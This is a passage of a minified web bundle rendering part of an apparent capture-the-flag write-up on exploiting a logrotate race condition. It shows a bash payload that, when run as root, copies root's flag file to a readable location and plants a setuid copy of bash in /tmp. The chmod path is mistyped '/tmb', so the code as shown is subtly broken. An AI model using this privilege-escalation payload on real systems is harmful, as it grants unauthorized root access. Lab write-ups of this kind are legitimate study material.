",(0,o.kt)("a",{parentName:"p",href:"https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition"},"https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"#!/bin/bash\nif [ `id -u` -eq 0 ]\nthen\n        cp /root/log.sh /tmp/cyfun/log.sh &\n        cp /root/log.cfg /tmp/cyfun/log.cfg &\n        cp /root/root.txt /tmp/cyfun/cyfun.txt\n        chmod +r /tmp/cyfun/cyfun.txt\n        cp /bin/bash /tmp/cyfun/cyfun\n        chmod +s /tmb/cyfun/cyfun\nfi\n")),(0,o.kt)("p",null,"Read root.txt"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ cat log.sh\n#!/bin/sh\n/usr/sbin/logrotate -f /root/log.cfg\n\n$ cat log.cfg\n/home/reader/backups/access.log {\n        daily\n        rotate 12\n        missingok\n        notifempty\n        size 1k\n        create\n}\n")))}m.isMDXComponent=!0},64881:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/book-3e748df16640d2551d856d6d6edf5c71.png"}}]);